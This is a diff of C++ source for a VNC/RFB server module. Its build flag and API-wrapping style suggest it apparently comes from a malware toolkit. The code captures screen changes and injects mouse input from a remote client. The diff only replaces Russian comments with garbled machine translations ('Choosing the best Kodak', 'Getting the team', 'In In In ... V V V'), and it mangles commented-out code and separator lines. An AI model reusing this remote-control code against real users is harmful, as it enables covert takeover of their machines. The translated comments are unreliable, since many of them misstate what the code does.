@@ -26,12 +26,12 @@
 
 #if(BO_VNC > 0)
 
-//Размер квадрата обноволений.
+//The size of the square obnovoleny.
 #define RECT_SIZE 96
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
-//События мыши.
+//Mouse events.
 #define MASK_POINTER_BUTTON_LEFT   0x01
 #define MASK_POINTER_BUTTON_MIDDLE 0x02
 #define MASK_POINTER_BUTTON_RIGHT  0x04
@@ -112,9 +112,9 @@ __inline void Translate(Rfb::INTERNAL_DATA *pid, BYTE *source, BYTE *dest, WORD 
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Hextile encoder
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In Hextile encoder
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 namespace HextileEncoder
 {
   #define HEXTILE_BUFFER_SIZE (16 * 16 * 4)
@@ -326,9 +326,9 @@ namespace HextileEncoder
   }   
 };
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Raw encoder
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In the Raw encoder
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 namespace RawEncoder
 {
   DWORD dwLastSize;
@@ -353,7 +353,7 @@ namespace RawEncoder
   }
 };
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #define SEARCH_RECT_CHANGES(var_type) \
 {\
@@ -411,17 +411,17 @@ static int SendChangedRects(SOCKET s, Rfb::INTERNAL_DATA *pid, Rfb::RECTANGLE *p
       DWORD dwMaxLx = (((wRectY + wRectHeight - 1) * pid->wWidth) + wRectX) * pid->bLocalPixelSize;
       DWORD dwLx    = (wRectY * pid->wWidth + wRectX) * pid->bLocalPixelSize;
       
-      //Получаем изменение в квадрате.
+      //Obtain the change in the square.
       if(pr->bIncremental != FALSE)
       { 
-        //Здесь основная нагрузка на CPU.
+        //Here, the main load on the CPU.
         if(pid->bLocalPixelSize == 1){SEARCH_RECT_CHANGES(BYTE);}
         else if(pid->bLocalPixelSize == 2){SEARCH_RECT_CHANGES(WORD);}
         else if(pid->bLocalPixelSize == 4){SEARCH_RECT_CHANGES(DWORD);}
         continue;
       }
 
-      //Измененя найдены.
+      //Changes were found.
       {
         RECT_CHANGED:
         DWORD dwMaxRectSize;
@@ -461,11 +461,11 @@ static int SendChangedRects(SOCKET s, Rfb::INTERNAL_DATA *pid, Rfb::RECTANGLE *p
   if(dwChanges == 0)iRetVal = 2;
   else
   {
-    //Отправка клиенту.
+    //Sending a client.
     WORD wHdr[2];
 
-    //((LPBYTE)&wHdr)[0] = 0;//FramebufferUpdate
-    //((LPBYTE)&wHdr)[1] = 0;//Padding
+    //((LPBYTE) & wHdr) [0] = 0; / / FramebufferUpdate
+    //((LPBYTE) & wHdr) [1] = 0; / / Padding
 
     wHdr[0] = 0; //FramebufferUpdate
     wHdr[1] = SWAP_WORD(dwChanges);
@@ -527,8 +527,8 @@ static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, 
   pid->memoryDc = memoryDc;
   pid->wWidth  = (WORD)pSize->x;
   pid->wHeight = (WORD)pSize->y;
-  //pid->dwCurrentEncoder      = Rfb::ENCODER_Raw;
-  //pid->dwCurrentEncoderSwapped = SWAP_DWORD(Rfb::ENCODER_Raw);
+  //pid-> dwCurrentEncoder = Rfb:: ENCODER_Raw;
+  //pid-> dwCurrentEncoderSwapped = SWAP_DWORD (Rfb:: ENCODER_Raw);
 
   if(hDIBMap != NULL)
   {
@@ -540,13 +540,13 @@ static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, 
       pid->dwWidthInBytes  = pid->wWidth * pid->bLocalPixelSize;
       pid->dwWidthInBytes  = ALIGN_UP(pid->dwWidthInBytes, sizeof(DWORD)); //The scan lines must be aligned on a DWORD except for RLE compressed bitmaps
 
-      //Заполняем даные о пиксиле.
+      //Fill The figures in about piksile.
       pid->pfLocalPixel.bBitsPerPixel = pbmi->bmiHeader.biBitCount;
       pid->pfLocalPixel.bDepth        = pbmi->bmiHeader.biBitCount;
       pid->pfLocalPixel.bBigEndian    = FALSE;
       pid->pfLocalPixel.bTrueColour   = pbmi->bmiHeader.biBitCount == 8 ? FALSE : TRUE;
     
-      //if(IsValidPIXEL_FORMAT(&pid->pfLocalPixel, true))
+      //if (IsValidPIXEL_FORMAT (& pid-> pfLocalPixel, true))
       {
         if(pid->pfLocalPixel.bTrueColour == TRUE)
         {
@@ -560,17 +560,17 @@ static inline Rfb::INTERNAL_DATA *InitINTERNAL_DATA(HDC memoryDc, POINT *pSize, 
           MaskToMaxAndShift(dwBlueMask,  &pid->pfLocalPixel.wBlueMax,  &pid->pfLocalPixel.bBlueShift);
         }
         
-        //Установка данных об клиетском пикселе по умолчанию.
+        //Setting data klietskom pixel by default.
         Mem::_copy(&pid->pfRemotePixel, &pid->pfLocalPixel, sizeof(Rfb::PIXEL_FORMAT));
         pid->pfRemotePixel.bTrueColour = TRUE;
         pid->bRemotePixelSize = pid->bLocalPixelSize;
 
-        //Выделение памяти для буфера изменений.
+        //Allocate memory for buffer changes.
         DWORD dwBmpSize = pid->dwWidthInBytes * pid->wHeight;
         if((pid->pBmpDIBOld = (LPBYTE)Mem::alloc(dwBmpSize)) != NULL)
         {
           if((pid->originalBitmap = (HBITMAP)CWA(gdi32, SelectObject)(pid->memoryDc, pid->hBitmap)) != NULL)ok = true;
-          //Mem::_set(pid->pBmpDIBOld, 0xFF, dwBmpSize);
+          //Mem:: _set (pid-> pBmpDIBOld, 0xFF, dwBmpSize);
           
         }
       }
@@ -660,12 +660,12 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
     LPSTR pstrMessage = NULL;
     DWORD dwSTSwap;
    
-    //Получение типа авторизации.
+    //Getting the type of authorization.
     pCallbacks->onSecurityType(pCallbacks->param, &dwST, &pstrMessage);
     dwSTSwap = SWAP_DWORD(dwST);
     if(!WSocket::tcpSend(s, &dwSTSwap, sizeof(DWORD)))dwST = ST_ERROR;
     
-    //Реакция на тип авторизации.
+    //Reaction to the type of authorization.
     switch(dwST)
     {
       case Rfb::ST_NONE: break;
@@ -699,7 +699,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
     
     if(memoryDc == NULL || (pInternalData = InitINTERNAL_DATA(memoryDc, &size, hDIBMap, mapOffset)) == NULL)return;
     
-    //Осовные данные.
+    //Osovnye data.
     DWORD dwNameLen = Str::_LengthA(pstrName);
     Rfb::MSG_SERVERINIT ServerInit;
 
@@ -712,7 +712,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
     ServerInit.pf.wGreenMax = SWAP_WORD(ServerInit.pf.wGreenMax);
     ServerInit.pf.wBlueMax  = SWAP_WORD(ServerInit.pf.wBlueMax);
 
-    //Отпровляем ответ.
+    //Otprovlyaem answer.
     if(!WSocket::tcpSend(s, &ServerInit, sizeof(Rfb::MSG_SERVERINIT)) || (dwNameLen > 0 && !WSocket::tcpSend(s, pstrName, dwNameLen)))
     {
       FreeINTERNAL_DATA(pInternalData);
@@ -720,26 +720,26 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
     }
   }
   
-  //Последнее состояние мышы.
+  //The last state myshy.
   EVENT_POINTER epLast;
   epLast.bButtonMask = 0;
   epLast.wXPos = 0xFFFF;
   epLast.wYPos = 0xFFFF;
 
-  //Последнее состояние клавы.
+  //The last state clave.
   BYTE ekVirtualCodes[0xFF];
   BYTE ekCharCodes[0xFF];
   Mem::_zero(ekVirtualCodes, sizeof(ekVirtualCodes));
   Mem::_zero(ekCharCodes, sizeof(ekCharCodes));
 
-  //Список областей, которые ожидают обновления.
+  //The list of areas that are pending renewal.
   DWORD dwWaitRectsCount  = 0;
   RECTANGLE *prcWaitRects = NULL;
 
-  //Цикл обработки "Client to server messages".
+  //Processing cycle "Client to server messages".
   for(;;)
   {
-    //Ожидание изменений, который не удалось получить в момент получения FramebufferUpdateRequest.
+    //Expectation of change which could not be obtained at the time of FramebufferUpdateRequest.
     if(dwWaitRectsCount > 0 && WSocket::tcpWaitForEvent(&s, 1, dwRefreshInterval, NULL, 0) == INVALID_SOCKET)
     {
       if(CWA(ws2_32, WSAGetLastError)() != WSAETIMEDOUT)goto END_LOOP;
@@ -759,14 +759,14 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
             if(i + 1 == dwWaitRectsCount)Mem::reallocEx(&prcWaitRects, sizeof(RECTANGLE) * (--dwWaitRectsCount));
             else Mem::_zero(&prcWaitRects[i], sizeof(RECTANGLE));
             break;
-          //case  2: break;
+          //case 2: break;
         }
       }
       if(updateMutex != NULL)CWA(kernel32, ReleaseMutex)(updateMutex);
       continue;
     }
 
-    //Получение команды.
+    //Getting the team.
     BYTE bMsg;
     if(!WSocket::tcpRecvAll(s, &bMsg, sizeof(BYTE), dwTimeout))goto END_LOOP;
     
@@ -788,7 +788,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
         pf.wGreenMax   = SWAP_WORD(pf.wGreenMax);
         pf.wBlueMax    = SWAP_WORD(pf.wBlueMax);
         
-        //Параноя.
+        //Paranoia.
         pf.bTrueColour = pf.bTrueColour == 0 ? FALSE : TRUE;
         pf.bBigEndian  = pf.bBigEndian  == 0 ? FALSE : TRUE;
 
@@ -818,13 +818,13 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
           {
             pInternalData->dwEncodingsList[i] = SWAP_DWORD(pInternalData->dwEncodingsList[i]);
 
-            //Выбираем лучший кодак на мой взгляд.
+            //Choosing the best Kodak in my opinion.
             if(pInternalData->dwEncodingsList[i] == ENCODER_Hextile)pInternalData->dwCurrentEncoder = ENCODER_Hextile;
           }
         }
         pInternalData->dwCurrentEncoderSwapped = SWAP_DWORD(pInternalData->dwCurrentEncoder);
 
-        //Создаем или удаялем буфер Hexlite.
+        //Create or udayalem buffer Hexlite.
         if(pInternalData->dwCurrentEncoder == ENCODER_Hextile)
         {
           if(pInternalData->pHextileBuffer == NULL && (pInternalData->pHextileBuffer = Mem::alloc(HEXTILE_BUFFER_SIZE)) == NULL)goto END_LOOP;
@@ -854,7 +854,7 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
         rect.wHeight      = SWAP_WORD(rect.wHeight);
         rect.bIncremental = rect.bIncremental == FALSE ? FALSE : TRUE;
         
-        //Добавляем квадрат в список.
+        //Add to the list box.
         DWORD i = 0;
         for(; i < dwWaitRectsCount; i++)if(prcWaitRects[i].wWidth == 0 && prcWaitRects[i].wHeight == 0)break;
         if(i == dwWaitRectsCount && !Mem::reallocEx(&prcWaitRects, sizeof(RECTANGLE) * (++dwWaitRectsCount)))goto END_LOOP;
@@ -889,37 +889,37 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
         DWORD dwFlags = MOUSEEVENTF_ABSOLUTE;
         bool bSwapped = (CWA(user32, GetSystemMetrics)(SM_SWAPBUTTON) != 0) ? true : false;
 
-        //Перемещение курсора.
+        //Move the cursor.
         if(ep.wXPos != epLast.wXPos || ep.wYPos != epLast.wYPos)dwFlags |= MOUSEEVENTF_MOVE;
 
-        //Левая кнопка.
+        //The left button.
         if((ep.bButtonMask & MASK_POINTER_BUTTON_LEFT) != (epLast.bButtonMask & MASK_POINTER_BUTTON_LEFT))
         {
           if(ep.bButtonMask & MASK_POINTER_BUTTON_LEFT)dwFlags |= bSwapped ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;
           else dwFlags |= bSwapped ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;
         }
         
-        //Правая кнопка.
+        //The right button.
         if((ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT) != (epLast.bButtonMask & MASK_POINTER_BUTTON_RIGHT))
         {
           if(ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT)dwFlags |= bSwapped ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTDOWN;
           else dwFlags |= bSwapped ? MOUSEEVENTF_LEFTUP : MOUSEEVENTF_RIGHTUP;
         }
 
-        //Средняя кнопка.
+        //The middle button.
         if((ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) != (epLast.bButtonMask & MASK_POINTER_BUTTON_MIDDLE))
         {
           dwFlags |= (ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
         }
 
-        //Прокрутка вверх
+        //Scroll Up
         if((ep.bButtonMask & MASK_POINTER_WHEEL_UP)/* && (epLast.bButtonMask & MASK_POINTER_WHEEL_UP) == 0*/)
         {
           dwFlags |= MOUSEEVENTF_WHEEL;
           dwWheel  = WHEEL_DELTA;
         }
 
-        //Прокрутка вниз
+        //Scroll Down
         if((ep.bButtonMask & MASK_POINTER_WHEEL_DOWN)/* && (epLast.bButtonMask & MASK_POINTER_WHEEL_DOWN) == 0*/)
         {
           dwFlags |= MOUSEEVENTF_WHEEL;
@@ -931,9 +931,8 @@ void Rfb::_ServerThread(SOCKET s, DWORD dwTimeout, SERVER_CALLBACKS *pCallbacks,
         break;
       }
 
-      /*
-        The client has new ISO 8859-1 (Latin-1) text in its cut buffer.
-      */
+      /*In In In In In In In In The client has new ISO 8859-1 (Latin-1) text in its cut buffer.
+V V V V V V*/
       case 6: //ClientCutText
       {
         BYTE pad[3];
